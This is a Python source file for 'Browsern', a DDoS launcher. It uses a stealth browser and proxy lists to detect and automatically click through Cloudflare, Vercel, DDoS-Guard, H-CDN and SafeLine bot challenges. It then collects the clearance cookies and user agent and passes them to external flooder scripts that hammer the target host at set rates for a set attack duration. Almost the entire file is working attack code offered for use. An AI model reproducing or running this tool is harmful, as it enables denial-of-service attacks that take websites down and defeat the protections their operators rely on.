'''
Coded by @udpboy (Neerd) & @Lexy_Tegyo (Lexys) | Browsern v2.8.2

Features v2.8.2:
 - Detect Cloudflare Challenge (Just a moment..., Checking your browser)
 - Detect Vercel Security Checkpoint
 - Auto Click Cloudflare Captcha/Turnstile

Cloudflare:
 - Interactive Challenge(Captcha)
 - Managed Challenge(UAM)
 - JavaScript Challenge
 - Turnstile
 - Custom Interactive Challenge(Captcha)
 - Custom Managed Challenge(UAM)

Safeline:
 - JavaScript Challenge
 - Captcha

Vercel Challenge
DDoS-Guard Challenge
H-CDN Challenge

Other JS Challenge
'''
import asyncio
import sys
import time
import os
import subprocess
import signal
import random
import string
import aiohttp

from browserforge.fingerprints import Screen
from camoufox.async_api import AsyncCamoufox

args = sys.argv[1:]

# HELP
if "-h" in args or "--help" in args:
    print("""
Coded by @udpboy (Neerd) | Browsern v2.8.2
Usage: xvfb-run -a python3 browsern.py <host> <duration> <rates> <threads> [options]

Arguments:
  <host>                Target host (example: https://example.com)
  <duration>            Attack duration (seconds) [default: 120]
  <rates>               Requests rate per second [default: 2]
  <threads>             Number of threads [default: 1]

Options:
  --ua <mode>             User agent mode (linux, windows, macos) [default: windows]
  --headless <mode>       Browser headless mode (True, False, virtual) [default: True]
  --optimize <value>      Optimize browser settings [default: False]
  --flooder <value>       Browser flooder [default: True]
  --browser <count>       Browser threads [default: 1]
  --proxy <value>         Path to proxy list file [format: ip:port]
  -h, --help              Show help and usage instructions

Examples:
 xvfb-run -a python3 browsern.py https://captcha.flexystat.dev 300 8 6 --ua windows
 xvfb-run -a python3 browsern.py https://captcha.flexystat.dev 300 8 8 --ua macos
""")
    sys.exit(0)

if len(args) < 4:
    print("""
Usage: xvfb-run -a python browsern.py <host> <duration> <rates> <threads> [options]
       xvfb-run -a python browsern.py --help
""")
    sys.exit(1)


def get_arg_value(name):
    if name in args:
        idx = args.index(name)
        if idx + 1 < len(args) and not args[idx+1].startswith("--"):
            return args[idx+1]
    return None

def get_arg_flag(name):
    return name in args

def generate_random_string(min_length, max_length):
    characters = string.ascii_letters + string.digits
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(characters) for _ in range(length))

# Arguments
host = args[0]
duration = int(args[1])
rates = int(args[2])
threads = int(args[3])
validkey = generate_random_string(5, 10)

# Options
os = get_arg_value("--ua") or "windows"
headless_raw = get_arg_value("--headless")
optimize = get_arg_flag("--optimize") or False
flood = get_arg_flag("--flooder") or True
browsers = get_arg_value("--browser") or 1
proxy_arg = get_arg_value("--proxy") or None
valid_os = ["linux", "windows", "macos"]

proxy_config = None
geoip = False

if headless_raw is None:
    headless = True

else:
    if headless_raw == "True":
        headless = True
    elif headless_raw == "False":
        headless = False
    elif headless_raw == "virtual":
        headless = "virtual"
    else:
        print(f"[INFO] Invalid headless mode: {headless_raw}")
        print("[INFO] Valid modes: True, False, virtual")
        sys.exit(1)

if os not in valid_os:
    print(f"[INFO] Invalid ua mode: {os}")
    print(f"[INFO] Valid modes: {', '.join(valid_os)}")
    sys.exit(1)

if proxy_arg:
    geoip = True

async def solve_safeline(page):
    try:
        element = await page.wait_for_selector("#sl-check", timeout=2000)
    except:
        element = None

    if not element:
        print("[INFO] Element #sl-check not found")
        return False

    bounding_box = await element.bounding_box()
    if not bounding_box:
        print("[INFO] Failed to get element bounding box")
        return False

    coord_x = bounding_box['x']
    coord_y = bounding_box['y']
    width = bounding_box['width']
    height = bounding_box['height']

    checkbox_x = coord_x + width / 2
    checkbox_y = coord_y + height / 2
#   print(checkbox_x, checkbox_y)
    await page.mouse.click(x=checkbox_x, y=checkbox_y)

    return True


async def click_cloudflare_checkbox(page):
    try:
        for _ in range(15):
            await asyncio.sleep(0.6)

            for frame in page.frames:
                if frame.url.startswith('https://challenges.cloudflare.com'):
                    frame_element = await frame.frame_element()
                    bounding_box = await frame_element.bounding_box()
                    if not bounding_box:
                        continue

                    coord_x = bounding_box['x']
                    coord_y = bounding_box['y']
                    width = bounding_box['width']
                    height = bounding_box['height']

                    checkbox_x = coord_x + width / 2
                    checkbox_y = coord_y + height / 2
#                    print(checkbox_x, checkbox_y)
                    await page.mouse.click(x=checkbox_x, y=checkbox_y)
    except Exception as e:
        return False
    finally:
     return True


async def cloudflare_bypass_example(host, proxy_config, proxy):
  try:
    async with AsyncCamoufox(
        headless=headless,
        proxy=proxy_config,
        geoip=geoip,
        humanize=optimize,
        os=os,
        screen=Screen(max_width=1920, max_height=1080),
        locale="en-US",
        args=[
                "--no-sandbox",
                '--disable-setuid-sandbox',
                "--disable-dev-shm-usage",
                "--disable-infobars",
                "--start-maximized",
                '--disable-extensions',
                "--lang=en-US,en;q=0.9",
                "--window-size=1920,1080",
        ]
    ) as browser:
        page = await browser.new_page()
        statuses = {}

        async def handle_response(response):
           status = response.status
           statuses[status] = statuses.get(status, 0) + 1

        page.on("response", handle_response)
        br = await page.goto(host)
        title = await page.title()
        content = await page.content()
        print(f"[INFO] Started Browser | Title: ({title}) | Status: {statuses}")
        await asyncio.sleep(0.8)
        statuses.clear()
        solved = True
        if title in ["Just a moment...", "Checking your browser...", "安全检查中……"]:
          print("[INFO] Detected Protection ~ Cloudflare Challenge")
          max_attempts = 5
          if geoip:
            await asyncio.sleep(5)
          for attempt in range(1, max_attempts + 1):
            solve = await click_cloudflare_checkbox(page)
            if solve:
              if geoip:
                await asyncio.sleep(8)
              await asyncio.sleep(0.8)
              cookies = await page.context.cookies()
              cf_cookie = next((c for c in cookies if c["name"] == "cf_clearance"), None)
              if not cf_cookie:
                solved = False
                await asyncio.sleep(0.1)
              else:
               solved = True
               print("[INFO] Cloudflare Challenge: Solved")
               break
        elif title == "Vercel Security Checkpoint":
           print("[INFO] Detected Protection ~ Vercel Challenge")
           await asyncio.sleep(15)
           title2 = await page.title()
           if title2 != title:
             print("[INFO] Vercel Challenge: Solved")
             solved = True
        elif title == "DDoS-Guard":
           print("[INFO] Detected Protection ~ DDoS-Guard Challenge")
           await asyncio.sleep(5)
           title2 = await page.title()
           if title2 != title:
             print("[INFO] DDoS-Guard Challenge: Solved")
             solved = True
        elif title == "Checking your browser before accessing. Just a moment...":
           print("[INFO] Detected Protection ~ H-CDN Challenge")
           await asyncio.sleep(5)
           title2 = await page.title()
           if title2 != title:
             print("[INFO] H-CDN Challenge: Solved")
             solved = True
        elif "https://waf.chaitin.com/challenge/v2/challenge.css" in content:
           print("[INFO] Detected Protection ~ SafeLine WAF Challenge")
           safeline = solve_safeline(page)
           if safeline:
             print("[INFO] SafeLine WAF Challenge: Solved")
             solved = True
           else:
             print("[INFO] SafeLine WAF Challenge: Failed")
        else:
          solved = True
          print("[INFO] Waiting 5s for JS challenge...")
          await asyncio.sleep(5)

        await asyncio.sleep(0.8)
        title2 = await page.title()
        ua = await page.evaluate("() => navigator.userAgent")
        cookies = await page.context.cookies()
        cookies = [c for c in cookies if c["name"] not in ["__cf_bm","_cfuvid","cf_chl_2","cf_chl_seq_","cf_chl_prog","cf_chl_rc_","cf_chl_cc_","_abck","bm_sv","bm_mi","ak_bmsc","nonce","csrf_token","xsrf-token"]] # cookie non-reusable
        cookie = " ".join(f"{c['name']}={c['value']}" for c in cookies)
        print(f"[INFO] Page Title: ({title2}) | Status Code: {statuses} | UserAgent: {ua} | Cookies: {cookie}")
        await page.close()
        await browser.close()
        if solved:
           args = [
              "node", "flooder.js", host, str(duration), str(rates), str(ua), str(cookie)
           ]
           args_p = [
             "screen", "-dm", "node", "floodbrs.js", host, str(duration), str(threads), str(proxy), str(rates),  str(cookie), str(ua), validkey
           ]
           if flood:
             if geoip:
               result = subprocess.run(args_p) #text=True, timeout=duration)
             else:
               result = subprocess.run(args, text=True, timeout=duration)
           else:
             sys.exit()
        else:
          await asyncio.sleep(0.1)
          await cloudflare_bypass_example(host, proxy_config, proxy)

  except Exception as err:
#     pass
     print(f"[Error] {err}")

async def load_proxies(path="proxies.txt"):
    q = asyncio.Queue()
    with open(path, "r") as f:
        for line in f:
            p = line.strip()
            if p:
                await q.put(p)
    return q

async def worker(name, proxy_queue):
    while not proxy_queue.empty():
        proxy = await proxy_queue.get()
        proxy_config = {
            "server": f"http://{proxy}"
        }

        ok = await cloudflare_bypass_example(host, proxy_config, proxy)

        if ok:
            print(f"[TASK {name}] selesai: {proxy}")
            return


async def main():
    proxy_queue = await load_proxies(proxy_arg)

    tasks = []

    for i in range(int(browsers)):
        t = asyncio.create_task(worker(i + 1, proxy_queue))
        tasks.append(t)

    await asyncio.gather(*tasks)

def signal_handler(sig, frame):
    print("\n[INFO] Received Ctrl+C signal. Cleaning up all processes")
    sys.exit()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

if __name__ == "__main__":
  print(f"[INFO] Browser Arguments [ duration: {duration}, rates: {rates}, threads: {threads} ]")
  print(f"[INFO] Browser Options [ headless: {headless}, os: {os}, optimize: {optimize} ]")
  if proxy_arg:
    asyncio.run(main())
  else:
    asyncio.run(cloudflare_bypass_example(host, proxy_arg, None))
